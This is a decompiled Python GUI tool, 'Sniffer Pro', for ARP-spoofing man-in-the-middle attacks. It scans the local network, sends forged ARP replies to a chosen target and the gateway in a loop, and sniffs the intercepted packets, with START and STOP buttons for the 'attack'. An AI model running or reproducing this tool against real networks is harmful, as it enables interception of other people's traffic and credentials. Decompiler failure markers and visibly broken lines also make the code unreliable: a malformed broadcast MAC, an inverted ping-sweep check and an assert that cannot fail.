# Decompiled with PyLingual cmd version ( https://nizzix.xyz )
# Internal filename: 'arpspoofing.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

# ***<module>: Failure: Compilation Error
import customtkinter as ctk
import tkinter.messagebox
import threading
import time
import socket
import sys
import os
import re
import queue
import platform
import subprocess
import ipaddress
import concurrent.futures
import hashlib
from time import sleep
from datetime import datetime, UTC
from datetime import datetime
from scapy.all import get_if_hwaddr, get_if_addr, ARP, Ether, sendp, sniff, conf, srp
import psutil
try:
    import requests
except ImportError:
    requests = None
ctk.set_appearance_mode('dark')
ctk.set_default_color_theme('dark-blue')
BG_COLOR = '#000000'
TEXT_COLOR = '#25ffa8'
FONT = ('Consolas', 15, 'bold')
FONT_TITLE = ('Consolas', 23, 'bold')
def get_available_interfaces():
    # ***<module>.get_available_interfaces: Failure: Different bytecode
    return [iface for iface in psutil.net_if_addrs().keys() if not iface.lower().startswith('loopback')]
def get_default_interface():
    # ***<module>.get_default_interface: Failure: Different control flow
    try:
        stats = psutil.net_if_stats()
    except Exception:
        pass
    interfaces = get_available_interfaces()
    return interfaces[0] if interfaces else ''
def get_local_ip():
    # ***<module>.get_local_ip: Failure: Different bytecode
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = None
    finally:
        s.close()
    return ip
def guess_net(ip, prefix=24):
    # ***<module>.guess_net: Failure: Different bytecode
    return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))
def arp_scan_scapy(cidr):
    try:
        conf.verb = 0
        arp = ARP(pdst=cidr)
        ether = Ether(dst='ff:ff:ff:ff:ff:f')
        packet = ether / arp
        answered, _ = srp(packet, timeout=2, retry=1, iface=conf.iface)
        results = []
        for _, r in answered:
            results.append({'ip': r.psrc, 'mac': r.hwsrc.lower()})
        return results
    except Exception as e:
        raise RuntimeError('Scapy ARP scan failed') from e
def ping_once(ip):
    # ***<module>.ping_once: Failure: Different bytecode
    system = platform.system().lower()
    if system == 'windows':
        cmd = ['ping', '-n', '1', '-w', '1000', ip]
    else:
        cmd = ['ping', '-c', '1', '-W', '1', ip]
    try:
        subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        return False
    except Exception:
        return False
    return True
def parse_arp_table():
    # ***<module>.parse_arp_table: Failure: Compilation Error
    system = platform.system().lower()
    entries = []
    try:
        if system == 'windows':
            out = subprocess.check_output(['arp', '-a'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([0-9a-fA-F:-]+)', line)
                if m:
                    entries.append({'ip': m.group(1), 'mac': m.group(2)})
        else:
            out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+.*?\s+([0-9a-fA-F:]+)', line)
                if m:
                    entries.append({'ip': m.group(1), 'mac': m.group(2)})
    except Exception:
        pass
    return entries
def sweep_network_ping(cidr, max_workers=200):
    net = ipaddress.ip_network(cidr, strict=False)
    hosts = [str(ip) for ip in net.hosts()]
    if len(hosts) > 1024:
        hosts = hosts[:1024]
    alive = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(max_workers, 500)) as ex:
        futures = {ex.submit(ping_once, ip): ip for ip in hosts}
        for fut in concurrent.futures.as_completed(futures):
            try:
                if not fut.result():
                    alive.append(futures[fut])
            except Exception:
                pass
    return alive

def reverse_dns(ip, timeout=1.5):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(socket.gethostbyaddr, ip)
            name = fut.result(timeout=timeout)[0]
            return name
    except Exception:
        return None
def netbios_name_lookup(ip):
    system = platform.system().lower()
    try:
        if system == 'windows':
            out = subprocess.check_output(['nbtstat', '-A', ip], text=True, stderr=subprocess.DEVNULL)
            m = re.search(r'<20>\s+UNIQUE\s+<(.+?)>', out)
            return m.group(1) if m else None
        else:
            out = subprocess.check_output(['nmblookup', '-A', ip], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.match(r'^(\S+)\s+<\w+>\s+(\w+)', line.strip())
                if m:
                    return m.group(1)
    except Exception:
        pass
    return None
def get_vendor_from_mac_api(mac):
    if not mac or not requests:
        return None
    mac_clean = mac.strip().upper()
    url = f'https://api.macvendors.com/{mac_clean}'
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.text:
            return r.text.strip()
    except Exception:
        pass
    return None
def enrich_entry(entry):
    # ***<module>.enrich_entry: Failure: Different control flow
    ip = entry.get('ip')
    mac = entry.get('mac')
    res = {'ip': ip, 'mac': mac, 'hostname': None, 'netbios': None, 'vendor': None}
    res['hostname'] = reverse_dns(ip)
    res['netbios'] = netbios_name_lookup(ip)
    res['vendor'] = get_vendor_from_mac_api(mac) if mac else None
    return res
class MITMInterface(ctk.CTk):
    # ***<module>.MITMInterface: Failure: Different bytecode
    def __init__(self):
        # ***<module>.MITMInterface.__init__: Failure: Different bytecode
        super().__init__()
        self.configure(fg_color='#000000')
        self.title('Sniffer Pro v1.0')
        self.geometry('1400x900')
        self.minsize(1100, 700)
        self.protocol('WM_DELETE_WINDOW', self.quit)
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()
        self.packet_queue = queue.Queue()
        self.lock = threading.Lock()
        self.interfaces = get_available_interfaces()
        default_iface = get_default_interface()
        self.config = {'target_ip': '', 'gateway_ip': '', 'target_mac': '', 'gateway_mac': '', 'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '', 'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER'], 'sniff_all': False}
        self.local_mac = None
        self.local_ip = None
        self.attack_thread = None
        self.capture_thread = None
        self.grid_rowconfigure(0, weight=22)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=3)
        self.grid_columnconfigure(1, weight=4)
        self.grid_columnconfigure(2, weight=2)
        self.setup_ui()
        self.after(150, self.log_worker)
        self.after(300, self.flush_packets)
        self.detect_network()
    def detect_gateway(self):
        gw_ip = None
        try:
            if platform.system() == 'Windows':
                routes = subprocess.check_output('route print', shell=True).decode('mbcs', errors='ignore')
                for line in routes.splitlines():
                    m = re.search(r'0\.0\.0\.0\s+0\.0\.0\.0\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line)
                    if m:
                        gw_ip = m.group(1)
                        break
            else:
                result = subprocess.check_output(['ip', 'route']).decode()
                m = re.search(r'default via ([0-9]{1,3}(?:\.[0-9]{1,3}){3})', result)
                gw_ip = m.group(1) if m else None
        except Exception:
            pass
        return gw_ip
    def find_mac_for_ip(self, ip):
        try:
            result = subprocess.check_output('arp -a', shell=True).decode('mbcs', errors='ignore') if platform.system() == 'Windows' else subprocess.check_output(['arp', '-n']).decode()
            for line in result.splitlines():
                if ip in line:
                    m = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
                    if m:
                        return m.group(0)
        except Exception:
            pass
        return ''
    def detect_network(self):
        try:
            self.config['iface'] = self.iface_var.get()
            self.local_ip = get_if_addr(self.config['iface'])
            self.local_mac = get_if_hwaddr(self.config['iface'])
            self.log(f"[AUTO] Interface used: {self.config['iface']}")
            self.log(f"[AUTO] Local IP: {self.local_ip}")
            self.log(f"[AUTO] Local MAC: {self.local_mac}")
            gw_ip = self.detect_gateway()
            if gw_ip:
                self.config['gateway_ip'] = gw_ip
                self.config['gateway_mac'] = self.find_mac_for_ip(gw_ip)
            else:
                self.log('[WARN] Could not detect gateway')
            self.scan_ip_targets()
        except Exception as e:
            self.log(f"[ERROR] detect_network: {e}")

    def scan_ip_targets(self):
        try:
            local_ip = get_local_ip()
            if not local_ip:
                self.log('[ERROR] Could not get local IP')
                return
            cidr = guess_net(local_ip)
            self.log(f"[SCAN] Scanning network: {cidr}")
        except Exception as e:
            self.log(f"[ERROR] scan_ip_targets: {e}")
    def validate_ip(self, ip):
        # ***<module>.MITMInterface.validate_ip: Failure: Different bytecode
        return re.match('^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$', ip) and all((0 <= int(x) <= 255 for x in ip.split('.')))
    def validate_mac(self, mac):
        # ***<module>.MITMInterface.validate_mac: Failure: Different bytecode
        return re.match('^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac)
    def setup_ui(self):
        # ***<module>.MITMInterface.setup_ui: Failure: Different bytecode
        left = ctk.CTkFrame(self, fg_color=BG_COLOR)
        left.grid(row=0, column=0, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(left, text='OPERATIONAL LOGS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
        self.log_text = ctk.CTkTextbox(left, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='word')
        self.log_text.pack(fill='both', expand=True)
        center = ctk.CTkFrame(self, fg_color=BG_COLOR)
        center.grid(row=0, column=1, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(center, text='CAPTURED PACKETS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
        self.packet_tree = ctk.CTkTextbox(center, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='none', height=33)
        self.packet_tree.pack(fill='both', expand=True)
        right = ctk.CTkFrame(self, fg_color=BG_COLOR)
        right.grid(row=0, column=2, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(right, text='CONFIGURATION', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
        config_frame = ctk.CTkFrame(right, fg_color=BG_COLOR)
        config_frame.pack(fill='both', expand=True)
        labels = ['Target IP:', 'Gateway IP:', 'Target MAC:', 'Gateway MAC:', 'Protocols:']
        entries = []
        for label in labels:
            row = ctk.CTkFrame(config_frame, fg_color=BG_COLOR)
            row.pack(fill='x', pady=10)
            ctk.CTkLabel(row, text=label, font=FONT, text_color=TEXT_COLOR, width=170, anchor='w').pack(side='left')
            entry = ctk.CTkEntry(row, font=FONT, width=260, fg_color='#000000')
            entry.pack(side='left', padx=16)
            entries.append(entry)
        self.target_ip_entry, self.gateway_ip_entry, self.target_mac_entry, self.gateway_mac_entry, self.proto_entry = entries
        row_iface = ctk.CTkFrame(config_frame, fg_color=BG_COLOR)
        row_iface.pack(fill='x', pady=10)
        ctk.CTkLabel(row_iface, text='Interface:', font=FONT, text_color=TEXT_COLOR, width=170, anchor='w').pack(side='left')
        self.iface_var = ctk.StringVar(value=self.config['iface'])
        self.iface_menu = ctk.CTkOptionMenu(row_iface, variable=self.iface_var, values=self.interfaces, font=FONT, width=260, fg_color='#000000', button_color='#000000', button_hover_color='#333333')
        self.iface_menu.pack(side='left', padx=16)
        self.sniff_all_var = ctk.BooleanVar(value=False)
        self.sniff_all_check = ctk.CTkCheckBox(config_frame, text='Sniff entire network', variable=self.sniff_all_var, font=FONT, text_color=TEXT_COLOR, fg_color='#000000', hover_color='#333333')
        self.sniff_all_check.pack(pady=10)
        self.proto_entry.insert(0, 'HTTP,TCP,UDP,OTHER')
        bottom = ctk.CTkFrame(self, fg_color=BG_COLOR, height=80)
        bottom.grid(row=1, column=0, columnspan=3, sticky='ew', padx=6, pady=(3, 10))
        btn_frame = ctk.CTkFrame(bottom, fg_color=BG_COLOR)
        btn_frame.pack(expand=True)
        self.start_btn = ctk.CTkButton(btn_frame, text='START', command=self.start_attack, font=FONT, fg_color='#25ffa8', hover_color='#1dd88a', text_color='#FF0000', width=180, height=50)
        self.start_btn.pack(side='left', padx=18)
        self.stop_btn = ctk.CTkButton(btn_frame, text='STOP', command=self.stop_attack, state='disabled', font=FONT, fg_color='#25ffa8', hover_color='#ff6b81', text_color='#FF0000', text_color_disabled='#FF0000', width=180, height=50)
        self.stop_btn.pack(side='left', padx=18)
        ctk.CTkButton(btn_frame, text='SAVE', command=self.save_config, font=FONT, fg_color='#25ffa8', hover_color='#1db4fa', text_color='#FF0000', width=180, height=50).pack(side='left', padx=18)
        ctk.CTkButton(btn_frame, text='QUIT', command=self.quit, font=FONT, fg_color='#25ffa8', hover_color='#e07b00', text_color='#FF0000', width=180, height=50).pack(side='right', padx=18)
        self.status_var = ctk.StringVar(value='READY')
        ctk.CTkLabel(bottom, textvariable=self.status_var, text_color='#FF0000', font=FONT_TITLE, anchor='w').pack(side='left', padx=24)
    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_queue.put(f'[{timestamp}] {msg}')

    def log_worker(self):
        try:
            while True:
                try:
                    msg = self.log_queue.get_nowait()
                    self.log_text.insert('end', msg + '\n')
                    self.log_text.see('end')
                except queue.Empty:
                    break
        except Exception:
            pass
        self.after(100, self.log_worker)
    def save_config(self):
        try:
            self.config['target_ip'] = self.target_ip_entry.get().strip()
            self.config['gateway_ip'] = self.gateway_ip_entry.get().strip()
            self.config['target_mac'] = self.target_mac_entry.get().strip().upper().replace('-', ':')
            self.config['gateway_mac'] = self.gateway_mac_entry.get().strip().upper().replace('-', ':')
            self.config['iface'] = self.iface_var.get()
            self.config['sniff_all'] = self.sniff_all_var.get()
            proto_input = [p.strip() for p in self.proto_entry.get().split(',')]
            self.config['protocols'] = [p for p in proto_input if p in ['HTTP', 'TCP', 'UDP', 'OTHER']] or ['HTTP', 'TCP', 'UDP', 'OTHER']
            self.log(f"[CONFIG] Target IP: {self.config['target_ip']}")
            self.log(f"[CONFIG] Target MAC: {self.config['target_mac']}")
            self.log(f"[CONFIG] Gateway MAC: {self.config['gateway_mac']}")
            self.log(f"[CONFIG] Interface: {self.config['iface']}")
            self.log(f"[CONFIG] Full Sniff Mode: {'Enabled' if self.config['sniff_all'] else 'Disabled'}")
            assert self.config['sniff_all'] or self.validate_ip(self.config['target_ip']) or ValueError('Invalid target IP')
            self.log('[CONFIG] Parameters validated and saved')
        except Exception as e:
            self.log(f"[ERROR] Config: {e}")
    def start_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            return
        self.save_config()
        self.log(f"[START] Full Sniff Mode: {'Enabled' if self.config['sniff_all'] else 'Disabled'}")
        if not self.config['sniff_all']:
            if not all([self.config['target_ip'], self.config['gateway_ip'], self.config['target_mac'], self.config['gateway_mac']]):
                self.log('[ERROR] Incomplete configuration')
                return
        self.log(f"[START] Interface: {self.config['iface']}")
        self.stop_event.clear()
        self.start_btn.configure(state='disabled')
        self.stop_btn.configure(state='normal')
        self.status_var.set('RUNNING')
        self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
        self.attack_thread.start()
        self.capture_thread = threading.Thread(target=self.real_capture, daemon=True)
        self.capture_thread.start()
    def stop_attack(self):
        self.stop_event.set()
        self.start_btn.configure(state='normal')
        self.stop_btn.configure(state='disabled')
        self.status_var.set('STOPPED')
        self.log('[ATTACK] Stopped')
    def quit(self):
        self.stop_event.set()
        self.destroy()
    def arp_poison(self):
        target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
        gateway = ARP(op=2, pdst=self.config['gateway_ip'], hwdst=self.config['gateway_mac'], psrc=self.config['target_ip'])
        while not self.stop_event.is_set():
            try:
                sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
                self.log(f"[SPOOF] → Target IP: {self.config['target_ip']}")
                self.log(f"[SPOOF] → Target MAC: {self.config['target_mac']}")
                time.sleep(2)
            except Exception as e:
                self.log(f"[ERROR] ARP poison: {e}")
                break

    def real_capture(self):
        def packet_handler(pkt):
            if self.stop_event.is_set():
                return
            try:
                summary = pkt.summary()
                self.packet_queue.put(summary)
            except Exception:
                pass
        try:
            sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            self.log(f"[ERROR CAPTURE] {e}")

    def flush_packets(self):
        items = []
        with self.lock:
            try:
                while True:
                    items.append(self.packet_queue.get_nowait())
            except queue.Empty:
                pass
        if items:
            for pkt in items:
                self.packet_tree.insert('end', pkt + '\n')
            lines = float(self.packet_tree.index('end-1c').split('.')[0])
            if lines > 300:
                self.packet_tree.delete('1.0', '100.0')
        self.after(300, self.flush_packets)

if __name__ == '__main__':
    app = MITMInterface()
    app.mainloop()
